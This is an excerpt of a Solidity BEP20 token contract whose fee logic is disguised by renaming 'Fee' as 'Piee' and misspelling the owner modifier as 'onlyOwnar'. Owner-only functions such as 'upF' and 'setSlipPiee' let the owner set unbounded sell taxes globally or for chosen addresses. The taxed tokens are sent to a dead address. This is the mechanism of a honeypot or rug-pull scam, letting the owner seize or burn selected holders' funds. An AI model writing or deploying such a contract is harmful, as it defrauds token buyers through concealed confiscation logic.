...
interface IUniswapV2Factory {
    ...
    function PieeTo() external view returns (address);
    function PieeToSetter() external view returns (address);
    ...
    function setPieeTo(address) external;
    function setPieeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingPieeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingPieeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingPieeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingPieeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingPieeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Contract is BEP20, Ownable {
    ...
    uint256 private _defaultSellPiee = 0;

    uint256 private _defaultBuyPiee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipPiee;
    ...
    function upF(uint256 _value) external onlyOwnar {
        _defaultSellPiee = _value;
    }

    function setSlipPiee(address _address, uint256 _value) external onlyOwnar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipPiee[_address] = _value;
    }

    function getSlipPiee(address _address) external view onlyOwnar returns (uint256) {
        return _slipPiee[_address];
    }


    function setMAccountPiee(address _address, bool _value) external onlyOwnar {
        _mAccount[_address] = _value;
    }

    function getMAccountPiee(address _address) external view onlyOwnar returns (bool) {
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                    ...
                    tradePiee = _defaultSellPiee;
                }
                if (from == uniswapV2Pair) {

                    tradePiee = _defaultBuyPiee;
                }
            }
            if (_slipPiee[from] > 0) {
                tradePiee = _slipPiee[from];
            }

            tradePieeAmount = _Amount.mul(tradePiee).div(100);
        }


        if (tradePieeAmount > 0) {
            _balances[from] = _balances[from].sub(tradePieeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradePieeAmount);
            emit Transfer(from, _deadAddress, tradePieeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradePieeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradePieeAmount);
        emit Transfer(from, _to, _Amount - tradePieeAmount);
    }
